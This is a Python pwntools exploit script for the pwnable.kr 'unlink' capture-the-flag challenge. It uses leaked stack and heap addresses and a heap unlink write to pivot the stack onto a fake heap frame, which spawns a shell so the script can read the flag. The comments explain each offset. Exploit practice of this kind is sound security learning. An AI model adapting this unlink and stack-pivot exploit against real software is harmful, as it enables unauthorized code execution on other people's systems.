from pwn import *

session = ssh('unlink', 'pwnable.kr', port=2222, password='guest')
session.download('unlink')
challenge_binary = ELF('unlink')

io = session.process('./unlink')
io.recvuntil('stack address leak: ')
stack_leak = int(io.recvline(False), 0)
io.recvuntil('heap address leak: ')
heap_leak = int(io.recvline(False), 0)

# This unlink flaw gives us a "swap 2 words" primitive. Pivoting the stack to
# the heap seems like the best solution. Other, simpler, attacks are off
# the table since one of the two words would probably be in a r-x page.

# We're going to overwrite main's saved ebp in unlink().
saved_ebp_addr = p32(stack_leak - 28)

# This is the value we want in ebp. We want it to point at the correct spot
# in our faked frame which we wrote on the heap. Our attack string starts
# at heap_leak + 8
ebp_value = p32(heap_leak + 12)
return_addr = p32(challenge_binary.functions['shell'].address)

# esp is restored from ecx, but minus 4. We want this to point to return_addr
# which we're placing at heap_leak + 20. Since ecx is loaded off of the stack
# we get to control it's value.
ecx_value = p32(heap_leak + 20 + 4)

# Again, all offsets in our attack_string are relative to heap_leak + 8.
attack_string  = ecx_value
attack_string += b'AAAA' # This is where ebp will point when we get ebp ctrl
attack_string += b'BBBB' # This value will get clobbered from the unlink
attack_string += return_addr
attack_string += ebp_value
attack_string += saved_ebp_addr

io.sendline(attack_string)
io.recvuntil('$ ')
io.sendline('cat flag')
print(io.recvline())
